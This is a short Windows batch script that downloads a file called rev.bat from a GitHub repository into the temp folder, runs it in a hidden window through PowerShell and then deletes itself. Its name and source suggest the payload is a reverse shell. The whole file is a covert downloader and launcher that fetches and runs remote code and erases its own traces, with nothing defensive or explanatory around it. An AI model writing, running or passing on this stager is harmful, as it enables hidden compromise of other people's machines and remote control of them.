@echo off
curl https://raw.githubusercontent.com/omarsamyX0/shell/main/rev.bat -o "%temp%\rev.bat"
powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
del "%~f0"
